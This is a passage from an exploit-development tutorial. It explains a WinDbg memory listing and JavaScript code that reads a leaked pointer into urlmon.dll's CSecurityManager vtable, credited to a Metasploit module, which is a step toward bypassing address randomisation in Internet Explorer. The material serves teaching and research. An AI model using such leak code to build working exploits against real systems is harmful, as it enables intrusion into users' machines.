```
0:017> !address 77254504

Usage:                    Image
Base Address:             77251000
End Address:              77331000
Region Size:              000e0000
State:                    00001000      MEM_COMMIT
Protect:                  00000020      PAGE_EXECUTE_READ
Type:                     01000000      MEM_IMAGE
Allocation Base:          77250000
Allocation Protect:       00000080      PAGE_EXECUTE_WRITECOPY
Image Path:               C:\\Windows\\syswow64\\urlmon.dll
Module Name:              urlmon
Loaded Image Name:        C:\\Windows\\syswow64\\urlmon.dll
```

We can see that the address belongs to urlmon.dll and that the base address is 0x77250000, making the RVA offset 0x4504. Now back to the line of code we were looking at:

```
var leak = text.value.substring(0, 2);
```

This code simply assigns the first two Unicode values that we just looked at to the variable leak. Here’s the next line:

```
var hex = parseInt(leak.charCodeAt(1).toString(16) // Line wrapped below
+ leak.charCodeAt().toString(16), 16);
```

As shown in the comment in the source code, this line was lifted from https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms13_037_svg_dashstyle.rb on April 20, 2017. It simply takes the leak variable and converts it from Unicode to hexadecimal in reverse order so that the value is 0x77254504 and not 0x45047725, due to the storage in memory. The following is the last line in the printLeak function:

```
text.value = "Leaked address: 0x"+hex.toString(16) // Line wrapped below
+ " - urlmon!CSecurityManager::vtable";
```

Here, we are simply setting text.value or “innerHTML” to the leaked and converted hexadecimal address so that it is displayed in the textarea location on the screen. Next to it we print “urlmon!CSecurityManager::vtable” because we confirmed this to be the destination of the leaked pointer.

In the HTML source, we also created a CButton that executes the printLeak function when it is clicked. The following images show the result before and after the button is clicked, respectively.